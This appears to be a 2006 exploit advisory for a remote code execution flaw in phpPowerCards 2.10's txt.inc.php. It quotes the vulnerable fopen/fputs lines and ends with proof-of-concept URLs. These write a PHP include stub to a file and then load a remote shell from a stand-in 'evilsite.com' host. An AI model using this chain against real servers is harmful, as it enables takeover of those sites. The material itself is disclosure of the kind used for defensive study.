<html><head><title>phpPowerCards 2.10 (txt.inc.php) Remote Code Execution Vulnerability</title></head><pre>+-------------------------------------------------------------------------------------------
+ phpPowerCards 2.10 (txt.inc.php) Remote Code Execution Vulnerability
+-------------------------------------------------------------------------------------------
+ Affected Software .: phpPowerCards 2.10
+ Vendor ............: http://www.giombetti.com/
+ Download ..........: http://lu.download.giombetti.com/phpPowerCards/phppowercards2.10.zip
+ Description .......: &quot;phpPowerCards is a powerfull PHP based postcard script.&quot;
+ Class .............: Remote Code Execution
+ Risk ..............: High (Remote Code Execution)
+ Found By ..........: nuffsaid &lt;nuffsaid[at]newbslove.us&gt;
+-------------------------------------------------------------------------------------------
+ Details:
+ phpPowerCards db/txt.inc.php does not initialize the $file variable before using it in the
+ fopen() function on line 10, after $file is opened it then writes several variables which
+ are also uninitialized to $file using the fputs() function. Assuming register_globals = on,
+ we can initialize these variables in a query string and then write anything to a file we
+ desire on the target box that's running phpPowerCards.
+ 
+ Vulnerable Code:
+ db/txt.inc.php, line(s) 10: $fp = fopen(&quot;$file&quot;,&quot;a&quot;);
+ db/txt.inc.php, line(s) 23: fputs($fp, $email[to]. &quot;¦¦&quot; .$email[from]. &quot;¦¦&quot; .$name[to]. &quot;¦¦&quot; .$name[from]. &quot;¦¦&quot; .$picture. &quot;¦¦&quot; .$comment. &quot;¦¦&quot; .$sessionID. &quot;\n&quot;);
+ 
+ Proof of Concept:
+ http://[target]/[path]/db/txt.inc.php?file=[file]&amp;check=0&amp;email[to]=[evil code]
+ http://[target]/[path]/db/txt.inc.php?file=[file]&amp;check=0&amp;comment=[evil code]
+ ... same thing repeated for each variable in the second argument of fputs() on line 23
+ 
+ -&gt; http://[target]/[path]/db/txt.inc.php?file=../evilfile.php&amp;check=0&amp;email[to]=+%3C%3Fphp+include%28%24evil_include%29%3B+%3F%3E+
+ -&gt; http://[target]/[path]/evilfile.php?evil_include=http://evilsite.com/shell.php
+-------------------------------------------------------------------------------------------

# milw0rm.com [2006-10-18]</pre></html>